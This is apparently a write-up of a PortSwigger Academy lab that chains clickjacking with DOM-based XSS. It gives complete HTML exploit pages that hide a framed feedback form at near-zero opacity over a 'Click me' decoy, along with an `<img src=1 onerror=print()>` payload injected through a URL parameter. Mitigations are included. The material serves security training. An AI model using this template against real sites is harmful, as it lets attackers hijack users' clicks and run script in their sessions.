# 📘 PortSwigger Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/learning-paths/clickjacking/clickjacking-with-dom-xss-attack/clickjacking/lab-exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss
> 🎯 Topic: Clickjacking (UI redressing) — Combined with DOM XSS
> 🧪 Difficulty: Practitioner
> ✅ Status: Solved

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [📡 Why Combine Clickjacking and XSS?](#combined)
- [⚡ The Delivery Mechanism](#iframe)
- [🔍 Step 1 — Identify the DOM XSS Vulnerability](#step1)
- [🔍 Step 2 — Construct the Base Exploit Payload](#step2)
- [🔍 Step 3 — Calibrate the Decoy Element](#step3)
- [🔍 Step 4 — Cloak the Target Frame](#step4)
- [🔍 Step 5 — Deliver Exploit to Victim](#step5)
- [📨 Example HTML Payload](#examples)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Use UI redressing techniques to act as a delivery mechanism for a DOM-based Cross-Site Scripting (XSS) attack:

```text
1. Exploit a form pre-population feature to inject an XSS payload into a target field.
2. Construct an HTML page that frames the target application.
3. Trick a logged-in user into clicking a decoy button ("Click me").
4. Force the user to unknowingly click the hidden "Submit feedback" button, which triggers the execution of the injected XSS payload (calling `print()`).
```

<a id="theory"></a>

## 🧠 Short Theory
While clickjacking is often used to execute state-changing actions (like deleting an account), its true potency is revealed when chained with other vulnerabilities. A DOM-based XSS vulnerability might require a user to interact with a specific element (like submitting a form) for the malicious payload to execute. 

By wrapping the vulnerable page in a clickjacking overlay, the attacker can force the victim to perform the exact interaction required to trigger the XSS, effectively turning a user-interaction-dependent XSS into a one-click exploit.

<a id="idea"></a>

## 🧩 Core Idea
The target application's "Submit feedback" form is vulnerable to DOM XSS via the `name` parameter. However, the XSS payload is only processed and executed when the form is submitted. 

```text
Attacker site:      Renders a "Click me" button.
Hidden iframe:      Loads the feedback form with the XSS payload injected via URL GET parameters.
Alignment:          Overlays the "Submit feedback" button exactly on top of "Click me".
Victim clicks:      Browser submits the form, processing the malicious `name` parameter.
Target server:      The DOM reflects the XSS payload, executing `print()` ✅
```

<a id="combined"></a>

## 📡 Why Combine Clickjacking and XSS?
Sometimes an XSS payload cannot execute automatically upon page load (e.g., it requires an `onclick` event, form submission, or a specific user journey). Relying on social engineering to convince a victim to type a payload and click submit is unreliable. Clickjacking provides a seamless, invisible delivery mechanism that guarantees the victim performs the required interaction.

<a id="iframe"></a>

## ⚡ The Delivery Mechanism
The attacker utilizes standard clickjacking CSS to hide the framed XSS vector:

```text
- opacity: 0.0001 (Makes the iframe virtually invisible to the human eye, but fully clickable).
- z-index: 2 (Places the iframe above the decoy element which has z-index 1).
- position: absolute/relative (Allows precise pixel-perfect alignment of elements).
```

<a id="step1"></a>

## 🔍 Step 1 — Identify the DOM XSS Vulnerability
Navigate to the "Submit feedback" page (`/feedback`).

Verify that the form fields can be pre-populated using URL parameters (e.g., `?name=test&email=test@test.com`).
Inject a standard XSS payload into the `name` parameter: `?name=<img src=1 onerror=print()>&email=hacker...`

Manually submit the form to confirm that the `print()` dialog appears, verifying the DOM XSS vulnerability is triggered upon submission.

<a id="step2"></a>

## 🔍 Step 2 — Construct the Base Exploit Payload
Open the Exploit Server. In the Body section, insert the basic HTML structure, embedding the target URL with the malicious XSS payload in the `name` parameter.

```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
    }
    div {
        position:absolute;
        top:610px;
        left:80px;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="https://LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

<a id="step3"></a>

## 🔍 Step 3 — Calibrate the Decoy Element
Set the iframe `opacity` to `0.1`.

Click **Store** and then **View exploit**.

Adjust the `top` and `left` pixel values of the `div` until the words "Test me" are perfectly centered underneath the **"Submit feedback"** button.

*Note: You can click "Test me" during calibration to verify the print dialog appears.*

<a id="step4"></a>

## 🔍 Step 4 — Cloak the Target Frame
Once alignment is perfect, finalize the payload for the victim:

- Change the decoy text from "Test me" to "Click me".
- Change the iframe `opacity` from `0.1` to `0.0001`.

<a id="step5"></a>

## 🔍 Step 5 — Deliver Exploit to Victim
Click **Store** to save the final invisible payload.

Click **Deliver exploit to victim**.

The victim's browser will load the exploit, click the decoy button, and unknowingly trigger the DOM XSS payload.

<a id="examples"></a>

## 📨 Example HTML Payload
Exploit Payload (Exploit Server Body)
```html
<style>
    iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:615px; 
        left:80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a4c0056039304f98086a3b500fd00db.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@test.com&subject=test&message=test#feedbackResult"></iframe>
```

<a id="response"></a>

## 📥 Example Result
Victim Interaction (Silent Success)
```text
1. Victim navigates to the Exploit Server URL.
2. The hidden iframe loads the feedback form with the embedded XSS payload.
3. Victim sees a blank page with a single "Click me" text and clicks it.
4. The click hits the "Submit feedback" button.
5. The DOM XSS executes, calling the `print()` function in the victim's browser context.
```

Lab status:

```text
Solved
```

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain
```text
1. Identify a DOM XSS vulnerability that requires user interaction (form submission).
2. Confirm the vulnerable form can be pre-populated via URL parameters.
3. Draft HTML payload framing the target site with the XSS payload injected into the URL.
4. Overlay a decoy element exactly beneath the target submission button.
5. Calibrate coordinates using semi-transparent opacity (0.1).
6. Set opacity to 0.0001 to make the attack invisible.
7. Deliver the hosted HTML payload to the victim.
8. Victim click triggers the XSS execution. Lab marked as Solved.
```

<a id="breakdown"></a>

## 🔬 Why the Attack Worked
1. Lack of Framing Protections
No `X-Frame-Options` or `Content-Security-Policy: frame-ancestors` headers were present, allowing the site to be embedded.

2. Unsafe DOM Processing
The application took user-supplied input from the URL (the `name` parameter) and insecurely processed it within the DOM upon form submission, enabling the XSS.

3. Synergistic Exploitation
Clickjacking bypassed the need for social engineering by forcing the victim to perform the exact interaction required to trigger the XSS vulnerability.

<a id="pentester"></a>

## 🧠 Pentester Mindset
When testing web applications:

```text
If I find an XSS vulnerability that requires a complex user interaction, can I automate that interaction using Clickjacking?
Can I use URL pre-population to smuggle XSS payloads into input fields that are later submitted by a hijacked click?
```

<a id="mistakes"></a>

## ❌ Common Mistakes
Mistake 1. Incorrect URL Encoding
Sometimes, complex XSS payloads (with spaces or special characters) must be properly URL-encoded when placed in the `iframe src` attribute to function correctly.

Mistake 2. Misaligning the Trigger Button
If the decoy is aligned with a harmless part of the page instead of the actual submission button, the victim's click will not trigger the XSS.

<a id="defense"></a>

## 🛡 Mitigation
1. Prevent Framing (Defeats the Clickjacking)
Implement `Content-Security-Policy: frame-ancestors 'none';` or `X-Frame-Options: DENY` to prevent the application from being embedded in an iframe.

2. Sanitize and Encode User Input (Defeats the XSS)
Ensure that all user-supplied data, especially data read from URL parameters, is strictly validated on the server side and properly HTML-encoded before being rendered or processed in the DOM. Avoid using dangerous DOM sinks like `innerHTML`.

<a id="checklist"></a>

## ✅ Checklist
Reconnaissance
- [ ] Logged in to the application
- [ ] Confirmed DOM XSS execution upon form submission
Payload Generation
- [ ] Created basic iframe and div structure
- [ ] Injected the XSS payload `<img src=1 onerror=print()>` into the URL
Execution & Verification
- [ ] Aligned decoy exactly beneath the "Submit feedback" button
- [ ] Changed text to "Click me" and opacity to `0.0001`
- [ ] Delivered exploit to victim
- [ ] Lab status: Solved

<a id="conclusion"></a>

## 🧾 Conclusion
The lab demonstrated the compounding danger of web vulnerabilities by combining Clickjacking with DOM XSS:

```text
1. Proved that Clickjacking is a highly effective delivery mechanism for interaction-dependent exploits.
2. Successfully tricked the victim into triggering an injected cross-site scripting payload.
```

Main lessons:
```text
- Vulnerabilities should not be evaluated in isolation; chained exploits significantly increase impact.
- Proper framing protections (`CSP`, `X-Frame-Options`) mitigate a wide class of client-side attacks.
- Robust input encoding is essential to prevent DOM-based XSS.
```
[⬆ Back to top](#top)
